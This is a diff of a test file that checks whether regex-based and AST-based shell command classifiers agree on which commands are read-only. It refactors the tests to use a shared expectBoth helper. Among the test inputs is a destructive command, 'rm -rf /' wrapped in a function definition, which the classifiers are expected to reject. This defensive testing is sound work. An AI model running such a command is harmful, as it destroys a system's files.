+    it(`${note ? `[${note}] ` : ''}${JSON.stringify(cmd).slice(0, 60)} → ${expected}`, () =>
+      expectBoth(cmd, expected));
   }
 
   // -----------------------------------------------------------------------
@@ -1325,36 +1093,24 @@ describe('consistency: isShellCommandReadOnly (regex) vs isShellCommandReadOnlyA
     it('[divergence] pure variable assignment: both return true', async () => {
       // Regex: skipEnvironmentAssignments → no root command → true
       // AST:   variable_assignment node → true
-      expect(isShellCommandReadOnly('FOO=bar')).toBe(true);
-      expect(await isShellCommandReadOnlyAST('FOO=bar')).toBe(true);
+      await expectBoth('FOO=bar', true);
     });
 
     it('[divergence] process substitution diff <(ls) <(ls -a): both return false', async () => {
       // diff is not in READ_ONLY_ROOT_COMMANDS in either implementation.
-      expect(isShellCommandReadOnly('diff <(ls) <(ls -a)')).toBe(false);
-      expect(await isShellCommandReadOnlyAST('diff <(ls) <(ls -a)')).toBe(
-        false,
-      );
+      await expectBoth('diff <(ls) <(ls -a)', false);
     });
 
     it('[divergence] control flow: both return false', async () => {
       // Regex: 'if' is not in READ_ONLY_ROOT_COMMANDS → false
       // AST:   if_statement → conservatively false
-      expect(isShellCommandReadOnly('if [ -f file ]; then cat file; fi')).toBe(
-        false,
-      );
-      expect(
-        await isShellCommandReadOnlyAST('if [ -f file ]; then cat file; fi'),
-      ).toBe(false);
+      await expectBoth('if [ -f file ]; then cat file; fi', false);
     });
 
     it('[divergence] function definition: both return false', async () => {
       // Regex: shell-quote parses 'foo()' as root → not in readonly → false
       // AST:   function_definition → false
-      expect(isShellCommandReadOnly('foo() { rm -rf /; }')).toBe(false);
-      expect(await isShellCommandReadOnlyAST('foo() { rm -rf /; }')).toBe(
-        false,
-      );
+      await expectBoth('foo() { rm -rf /; }', false);
     });
   });
 });
